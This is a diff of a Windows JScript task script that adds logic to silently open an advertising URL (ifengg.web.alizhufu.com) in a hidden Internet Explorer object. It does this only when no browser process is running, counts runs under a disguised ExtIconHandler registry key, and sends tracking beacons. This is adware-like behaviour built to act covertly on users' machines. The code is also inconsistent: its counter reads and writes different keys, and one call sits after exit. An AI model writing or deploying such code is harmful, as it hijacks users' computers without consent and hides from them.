@@ -1,12 +1,33 @@
+//
 var __title = "http://ifengg.web.alizhufu.com/?=7000"
 //alert(0)
-
-if (FindWindow(__title)){
+var taskid = 30001
+if ( !FindExeInBlacklist() || GetTaskXRunTimes(taskid)){
 	exit(4000+1)
+	sendHttpStat("openurl", "t_30001_exit" ,  1);  
 }
 else{
 	CreateIEObject()
+	sendHttpStat("openurl", "t_30001_alizhufu" ,  1);  
+	SetTaskXRunTimeXX(taskid)
 	exit(4000)
+}
+function GetTaskXRunTimes(taskid){
+	var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+taskid)} );
+	if(regvalue){
+		return regvalue;
+	}else{
+		return 0;
+	}
+}
+function SetTaskXRunTimeXX(taskid){
+	var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\t_"+taskid)} );
+	if(regvalue){
+		regvalue++;
+	}else{
+		regvalue=1;
+	}
+	__TRY(function (){__wshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\t_"+taskid, 1, "REG_DWORD")})
 }
 function FindWindow (title){//模糊查找窗口标题
 	var find=0;
@@ -22,6 +43,26 @@ function FindWindow (title){//模糊查找窗口标题
 	}); 
 	return find	
 }
+function FindExeInBlacklist(){
+	var blacklist=["iexplore", "liebao", "Firefox",
+					"chrome"];
+	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
+	
+	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
+	for (var index in blacklist){
+		var name = blacklist[index];
+		wql += " or Name like '%" + name+"%'";	
+	}
+	
+	var process = new Enumerator (__service.ExecQuery(wql)).item();	
+	if(process){
+		log("exist process " + process.Name + "   ; wql="+wql)
+		return true;
+	}else{
+		return false;
+	}	
+}
+
 function CreateIEObject()
 {
 	var __ie = new ActiveXObject ("internetexplorer.application");
